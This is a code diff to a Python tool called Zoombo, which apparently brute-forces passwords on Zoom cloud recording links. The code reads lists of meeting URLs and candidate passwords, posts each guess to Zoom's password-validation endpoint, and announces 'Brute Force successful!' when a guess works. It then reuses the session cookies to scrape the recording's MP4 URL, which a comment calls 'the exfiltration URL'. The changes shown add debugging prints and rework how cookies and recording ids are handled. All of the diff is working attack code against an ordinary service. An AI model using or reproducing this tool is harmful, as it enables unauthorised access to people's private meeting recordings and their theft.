@@ -68,7 +68,7 @@ class Zoombo:
 
     @staticmethod
     def get_video_url_from_source_code(soup):
-        for i in str(soup.findChildren("script")[-3]).split(','):
+        for i in str(soup.findChildren("script")).split(','):
             if "viewMp4Url" in i:
                 return i.split("'")[1]
         return None
@@ -91,6 +91,7 @@ class Zoombo:
                 meeting_urls = meeting_list.read().splitlines()
 
                 for meeting in meeting_urls:
+                    print(f"Targeting: {meeting}")
                     for password in passwords:
                         self.check_credentials(meeting, password)
         else:
@@ -105,24 +106,20 @@ class Zoombo:
         form_submit_headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
 
         # Step 1: Login
-        login_request = requests.post(f"https://{self.get_org_id_from_url(url)}.zoom.us/rec/validate_meet_passwd",
-                                      data=data,
-                                      headers=form_submit_headers)
+        login_url = f"https://{self.get_org_id_from_url(url)}.zoom.us/rec/validate_meet_passwd"
+        login_request = requests.post(f"{login_url}", data=data, headers=form_submit_headers)
 
         # Step 1: Login - Successful
         if login_request.status_code == 200 and json.loads(login_request.text).get('status'):
             self.c_print(f"[***] Brute Force successful! Correct password is: {password}")
             # We found a valid request. Now we need to get the cookie it gives us.
-            recording_name = list(login_request.cookies.get_dict().keys())[-1]
-            cookie_value = login_request.cookies.get_dict()[recording_name]
-            cookies = {recording_name: cookie_value}
-
+            recording_name = self.get_recording_id_from_url(url)
             # This gets the exfiltration URL
 
             # Step 2 - Get Play URL from Successful Login cookies + URL
             play_request = requests.get(f"https://{self.get_org_id_from_url(url)}.zoom.us/rec/share/{recording_name}",
                                         headers=self.headers,
-                                        cookies=cookies,
+                                        cookies=login_request.cookies.get_dict(),
                                         allow_redirects=True)
 
             soup = BeautifulSoup(play_request.text, "html.parser")
@@ -145,6 +142,9 @@ class Zoombo:
                 else:
                     self.c_print(f"[?] Can't access file")
             else:
+                print(f"Video url: {video_url}")
+                print(f"Soup: {soup}")
+
                 self.c_print(f"[?] Failed to get URL")
         else:
             self.c_print(f"[?] Password failed; {password}")
